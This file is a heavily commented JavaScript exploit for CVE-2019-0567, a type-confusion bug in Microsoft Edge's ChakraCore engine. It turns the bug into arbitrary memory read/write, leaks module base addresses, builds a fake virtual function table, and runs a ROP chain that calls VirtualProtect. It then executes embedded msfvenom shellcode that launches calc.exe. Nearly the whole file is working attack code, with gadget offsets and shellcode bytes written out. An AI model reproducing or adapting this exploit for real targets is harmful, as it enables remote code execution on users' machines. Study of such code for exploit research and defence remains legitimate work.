//
// CVE-2019-0567 Microsoft Edge/ChakraCore Type Confusion 
// With CFG _NOT_ enabled this exploits pops calc.exe via msfvenom shellcode.
// Exploit technique: Classic funciton pointer overwrite
// Author: Connor McGarr (@33y0re)
// filename: exploit.js
// Usage: ch.exe C:\Path\To\exploit.js
//

//
// Creating object obj
// Properties are stored via auxSlots since properties weren't declared inline
//
obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

//
// Create two DataView objects. These will be used
// for our read/write primitive.
//
dataview1 = new DataView(new ArrayBuffer(0x100));
dataview2 = new DataView(new ArrayBuffer(0x100));

//
// Function to convert to hex for memory addresses
//
function hex(x)
{
    return x.toString(16);
}

//
// Arbitrary read function
//
function read64(lo, hi)
{
    //
    // We use a "4 byte write" in our case since JavaScript
    // cannot represent a full 64-bit address. So we use a "hack"
    // by using 2 32-bit addresses (splitting the address into "high" and "low").
    //
    // This sets DataView->buffer to the address we want to read from.
    //
	dataview1.setUint32(0x38, lo, true); 		// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, hi, true);		// We set this to the memory address we want to read from (4 bytes at a time: e.g. 0x38 and 0x3C)

	// Instead of returning a 64-bit value here, we will create a 32-bit typed array and return the entire away
	// Write primitive requires breaking the 64-bit address up into 2 32-bit values so this allows us an easy way to do this
	var arrayRead = new Uint32Array(0x10);
	arrayRead[0] = dataview2.getUint32(0x0, true); 	// 4-byte arbitrary read
	arrayRead[1] = dataview2.getUint32(0x4, true);	// 4-byte arbitrary read

	// Return the array
	return arrayRead;
}

//
// Arbitrary write function
//
function write64(lo, hi, valLo, valHi)
{
    //
    // Set the address we want to write to on the DataView buffer.
    //
	dataview1.setUint32(0x38, lo, true); 		// DataView+0x38 = dataview2->buffer
	dataview1.setUint32(0x3C, hi, true);		// We set this to the memory address we want to write to (4 bytes at a time: e.g. 0x38 and 0x3C)

	// Perform the write with our 64-bit value (broken into two 4 bytes values, because of JavaScript)
	dataview2.setUint32(0x0, valLo, true);		// 4-byte arbitrary write
	dataview2.setUint32(0x4, valHi, true);		// 4-byte arbitrary write
}

//
// Function used to set prototype on tmp function to cause type transition on o object.
//
function opt(o, proto, value)
{
    o.b = 1;

    let tmp = {__proto__: proto};

    o.a = value;
}

//
// main function
//
function main()
{
    //
    // Force opt() to become optimized.
    //
    for (let i = 0; i < 2000; i++)
    {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    //
    // With opt() optimized, create
    // another object to be used
    // with opt(). The object "o"
    // in this case will undergo a 
    // type transition.
    //
    let o = {a: 1, b: 2};

    //
    // Cause the type confusion. "o" now
    // references objects via auxSlots,
    // but the object is never updated/informed
    // of this. o->auxSlots will now point to 
    // addressof(obj).
    //
    opt(o, o, obj);

    //
    // Corrupt obj->auxSlots with the address of the first DataView object.
    //
    o.c = dataview1;

    //
    // Corrupt dataview1->buffer with the address of the second DataView object.
    //
    obj.h = dataview2;

    //
    // dataview1 methods act on dataview2 object
    // Since vftable is located from 0x0 - 0x8 in dataview2, we can simply
    // just retrieve it without going through our read64() function.
    //
    vtableLo = dataview1.getUint32(0, true);
	vtableHigh = dataview1.getUint32(4, true);

    //
	// Print update.
    //
    print("[+] DataView object 2 leaked vtable from ChakraCore.dll: 0x" + hex(vtableHigh) + hex(vtableLo));

    //
    // Store the base address of ChakraCore.dll. The leaked
    // vftable pointer is located at an offset of 0x1961298
    // from ChakraCore.dll. This can be confirmed in WinDbg
    // via:
    //
    // ? vtable_pointer_address - ChakraCore_base_address
    //
    chakraLo = vtableLo - 0x1961298;
    
    //
    // chakraHigh is set to vtableHigh because ASLR
    // only affects the lower 32-bits of a 64-bit address
    // (in our case).
    //
    chakraHigh = vtableHigh;

    //
	// Print update.
    //
    print("[+] ChakraCore.dll base address: 0x" + hex(chakraHigh) + hex(chakraLo));

    //
    // Here is the gameplan. We are going to create an ArrayBuffer object.
    // We are then going to corrupt the metadata of this object. All object's
    // have a first member of a vftable pointer, so that when methods invoked
    // against the specific object are called, they are called through the vftable.
    // 
    // For instance, DataView objects have a vftable pointer. When we invoke
    // DataView.setUint32() that will fetch the vftable associated with the specific
    // DataView object we are operating on and then index the table for the appropriate
    // virtual function which has the C++ functionality for .setUint32().
    //
    // We are going to replace that vftable pointer in the ArrayBuffer object
    // with an address in the .data section of ChakraCore.dll. We are going to write
    // a ROP chain to that address in the .data section, which will be our "fake vftable".
    //
    // We will then invoke the .byteLength property on the ArrayObject. That will cause the
    // chakracore!Js::ArrayBuffer::GetByteLength virtual function to be called - which is the
    // 70th function in the ArrayBuffer "legitimate" vftable. 
    //
    // What we are going to do is replace the 70th QWORD of our "fake vftable" with a ROP gadget that
    // performs a stack pivot. We will then update the ArrayBuffer object to use our fake vftable. When
    // we then invoke .byteLength on the ArrayBuffer object of whom we just corrupted the vftable pointer,
    // it will use the 70th QWORD of our fake vftable - thinking it is invoking the "real" vftable's 70th function
    // (which would be the actual GetByteLength) function. This will invoke our stack pivot and lead
    // right into our ROP chain!
    //

    //
	// Print update.
    //
    print("[+] Creating an ArrayBuffer object!");
   
    //
    // Here we create the ArrayBuffer.
    //
    arrayBufferObj = new ArrayBuffer(8);

    //
    // Corrupt dataview1->buffer with the address of the ArrayBuffer object.
    //
    obj.h = arrayBufferObj;

    //
    // dataview1 methods act on the ArrayBuffer object
    // Since vftable is located from 0x0 - 0x8 in arrayBufferObj, we can simply
    // just retrieve it by reading in the first 0x8 bytes.
    //
    arrayBufferVtableLo = dataview1.getUint32(0, true);
	arrayBufferVtableHigh = dataview1.getUint32(4, true);

    //
	// Print update.
    //
    print("[+] Leaked the ArrayBuffer object's virtual function table!");

    //
    // Now that we have the vftable address, change obj.h
    // back to dataview2 so we can use read64() and write64().
    //
    obj.h = dataview2;

    //
    // This is the address from the .data section of ChakraCore.dll
    // where we will store our fake ROP chain.
    //
    // Why did I choose chakracore+0x1d38a1c?
    //
    // Using the !dh chakracore.dll command in WinDbg we get the virtual
    // address of the .data section (read/write memory). We also get the
    // size of the section. Taking the offset to the .data section plus
    // the size gives us the "end" of the .data section. This gives us
    // the address where the last data is stored. However, due to things
    // like sections needing to be page-aligned, there is lots of uninitialized/
    // unused data at the end of the .data section where we can store our data
    // since it is read/write.
    //
    fakevftableLo = chakraLo+0x1d38a1c;
    fakevftableHigh = chakraHigh;

    //
	// Print update.
    //
    print("[+] Constructing the fake virtual function table!");

    //
    // Read in and store the first 68 virtual functions
    // from the vftable. This is to ensure we _only_ corrupt
    // the 70th function. 0x378 bytes divided by the size
    // of a pointer is 0x6F. By looping 0x378 bytes at a 0x8
    // byte interval we will successfully capture and store the
    // first 0x6f functions in our fake ROP chain. Then we will
    // precisely write to the 0x70th function.
    //
    for (i = 0; i < 0x378; i+=0x8)
    {
        //
        // This reads in the address of the next virtual function from
        // the ArrayBuffer's virtual function table.
        //
        virtualFunctionAddr = read64(arrayBufferVtableLo+i, arrayBufferVtableHigh);

        //
        // Write the function address to our fake ROP chain.
        //
        write64(fakevftableLo+i, fakevftableHigh, virtualFunctionAddr[0], virtualFunctionAddr[1]);
    }

    //
    // +++++++++++++++++++++++++++++++++++++++++++++
    // +    Our ROP chain begins here!!!!!!!!!     +
    // +    We are overwriting the 0x70th entry    +
    // + in our fake ROP chain with a stack pivot. +
    // +++++++++++++++++++++++++++++++++++++++++++++
    //

    //
    // KERNEL32!VirtualProtectStub IAT address.
    //
    virtualProtectLo = chakraLo+0x17c0058;
    virtualProtectHigh = chakraHigh;

    //
    // Address where the old protection
    // option will be stored from VirtualProtect.
    //
    // This just needs to be any writable address.
    //
    lpflOldProtectLo = chakraLo+0x1d38fac;
    lpflOldProtectHigh = chakraHigh;

    //
    // Shellcode location. This is a random
    // address from the .data section that is RW
    // and empty.
    //
    shellcodeAddressLo = chakraLo+0x1d38e6c;
    shellcodeAddressHigh = chakraHigh;

    //
    // Counter for our shellcode writing.
    //
    counter = 0;

    //
	// Print update.
    //
    print("[+] Writing the shellcode to the .data section of ChakraCore.dll!");

    //
    // Write our shellcode.
    //
    write64(shellcodeAddressLo+counter, chakraHigh, 0x48fc0000, 0xe8f0e483);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x000000c0, 0x50415141);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x48565152, 0x4865d231);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4860528b, 0x4818528b);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4820528b, 0x4850728b);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4a4ab70f, 0x48c9314d);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x3cacc031, 0x2c027c61);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xc9c14120, 0xc101410d);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4152ede2, 0x528b4851);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x3c428b20, 0x8bd00148);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x00008880, 0xc0854800);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x01486774, 0x488b50d0);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x408b4418, 0xd0014920);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xff4856e3, 0x348b41c9);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xd6014888, 0x48c9314d);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x41acc031, 0x410dc9c1);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xe038c101, 0x034cf175);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4508244c, 0xd875d139);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x408b4458, 0xd0014924);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x0c8b4166, 0x408b4448);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xd001491c, 0x88048b41);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x41d00148, 0x5e584158);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x58415a59, 0x5a415941);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x20ec8348, 0xe0ff5241);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x5a594158, 0xe9128b48);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xffffff57, 0x01ba485d);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x00000000, 0x48000000);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x01018d8d, 0xba410000);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x876f8b31, 0xf0bbd5ff);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x4156a2b5, 0xbd95a6ba);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x48d5ff9d, 0x3c28c483);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x800a7c06, 0x0575e0fb);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x721347bb, 0x59006a6f);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0xffda8941, 0x6c6163d5);
    counter+=0x8
    write64(shellcodeAddressLo+counter, chakraHigh, 0x78652e63, 0x00000065);

    //
    // This is a counter for our ROP chain
    // so we can easily keep track of each 0x8 bytes
    // we write to.
    //
    offset = 0x388;

    //
    // Offset 0x380 is the 0x70th function.
    //
    offsetToTargetVtable = 0x380;

    //
    // This is the stack pivot. This stack pivot gets executed via a
    // call qword [rax+0x380]. Since the stack pivot is xchg rax, rsp,
    // RSP will then be changed to RAX. However, this stack pivot occurs
    // at RAX + 0x380. This means our stack pivot takes us "backwards".
    // So, although visually in this script it looks as though the stack
    // pivot comes first in the ROP buffer, it comes at an offset of 0x380.
    // We fill the first 0x380 bytes with the actual ROP gadgets we want to execute.
    //
    write64(fakevftableLo+offsetToTargetVtable, fakevftableHigh, chakraLo+0x143e692, chakraHigh);   // 0x18143e692: xchg rax, rsp ; ret ; (1 found)

    //
    // The second ROP gadget is here. This is a "special" ROP gadget to jump over the entire
    // fake virtual function table. The virtual function table will still be used
    // by our ArrayBuffer object to manage things behind the scenes. This means
    // that there are functions that legitimately need to be called under the hood.
    // We can't start our ROP chain at the beginning of the virtual function table, as 
    // each subsequent gadget would corrupt virtual functions we previously captured in
    // our for loop. This this case, to get around this, we just jump over all of our fake
    // virtual functions. This ensures none of the virtual functions needed by our ArrayBuffer
    // are corrupted. However, because our stack pivot will redirect execution to the beginning
    // of our virutal function table, we need to overwrite the first virtual function with
    // the add rsp, 0x388 gadget. The first virtual function in this table isn't used, so
    // we do not need to worry about overwriting it.
    //
    write64(fakevftableLo, fakevftableHigh, chakraLo+0xfd465a, chakraHigh);                         // 0x180fd465a: add rsp, 0x0000000000000388 ; ret ; (1 found)

    //
    // Our "actual" ROP chain starts here, where we prepare arguments for
    // VirtualProtect().
    //
    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Padding from the add rsp, 0x388 ; ret gadget.
    offset+=0x8;

    //
    // VirtualProtect(ShellcodeAddress, 0x1000, PAGE_EXECUTE_READWRITE, &lpflOldProtect);
    //
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x3e5cc, chakraHigh);                   // 0x18003e5cc: pop rcx ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, shellcodeAddressLo, shellcodeAddressHigh);       // Address we want to make RWX (our shellcode)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x3e451, chakraHigh);                   // 0x18003e451: pop rdx ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x00001000, 0x00000000);                         // SIZE_T (0x1000 - size we want to make executable. VirtualProtect rounds up to page-aligned anyways.)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x152decc, chakraHigh);                 // 0x18152decc: pop r8 ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x00000040, 0x00000000);                         // PAGE_EXECUTE_READWRITE (0x40)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x3e691, chakraHigh);                   // 0x18003e691: pop r9 ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, lpflOldProtectLo, lpflOldProtectHigh);           // UINT (MB_OK/0)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x3e762, chakraHigh);                   // 0x18003e762: pop rax ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, virtualProtectLo, virtualProtectHigh);           // addressof(KERNEL32!VirtualProtectStub)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x5806a, chakraHigh);                   // 0x18005806a: mov rax, qword [rax] ; ret ; (1 found) (Retrieve the actual address of KERNEL32!VirtualProtectStub.)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0xa4b14, chakraHigh);                   // 0x1800a4b14: jmp rax ; (1 found) (Call KERNEL32!VirtualProtectStub)
    offset+=0x8;

    //
    // VirtualProtect is using the next 0x20 bytes for shadow space, per the __fastcall
    // calling convention. When VirtualProtect returns, these next 0x20 bytes are blown
    // away. Therefore, set them to random values we don't care about and make sure our
    // ROP chain and add an add rsp to jump over the shadow space into the ROP chain.
    //
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x1777972, chakraHigh);                 // 0x181777972: add rsp, 0x20 ; pop rbp ; ret ; (1 found)
    offset+=0x8;

    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Compensate for shadow space
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Compensate for shadow space
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Compensate for shadow space
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Compensate for shadow space
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, 0x41414141, 0x41414141);                         // Compensate for the pop rbp instruction
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x62d30, chakraHigh);                   // 0x180062d30: pop rax ; ret ; (1 found)
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, shellcodeAddressLo, shellcodeAddressHigh);       // Store our shellcode address in RAX.
    offset+=0x8;
    write64(fakevftableLo+offset, fakevftableHigh, chakraLo+0x3f502, chakraHigh);                   // 0x18003f502: push rax ; ret ; (1 found) (This will return into our shellcode and execute it)

    //
    // Okay our ROP chain has been written to the .data section.
    // We now need to corrupt the ArrayBuffer's vftable pointer.
    //

    //
    // Corrupt dataview1->buffer with the address of the ArrayBuffer object.
    //
    obj.h = arrayBufferObj;

    //
    // Overwrite arrayBufferObj->vftable with the
    // address of our ROP chain.
    //
    dataview1.setUint32(0, fakevftableLo, true);
    dataview1.setUint32(4, fakevftableHigh, true);

    //
	// Print update.
    //
    print("[+] Overwrote the Arraybuffer object's virtual function table pointer with the fake vftable!");
    print("[+] Executing our ROP chain!");

    //
    // By accessing the byteLength property (which is a valid property for all ArrayBuffer objects)
    // we cause ChakraCore to invoke the chakracore!Js::ArrayBuffer::GetByteLength virtual function
    // on the ArrayBuffer object arrayBufferObj. Remember, browsers are written in C++. This means that
    // each JavaScript object is managed as a C++ object under the hood. C++ objects expose methods on these
    // objects - which is essentially what is done here. When byteLength is requested, the virtual function 
    // for the ArrayBuffer object which does this work (GetByteLength()) is executed. However, we have overwritten
    // the GetByteLength() function with a ROP gadget instead - meaning that when byteLength is requested, our ROP
    // gadget is called instead which starts our ROP chain. This is a _classic_ function pointer overwrite.
    // With CFG disabled, this isn't prevented.
    //
    arrayBufferObj.byteLength;
}

//
// Run the exploit.
//
main();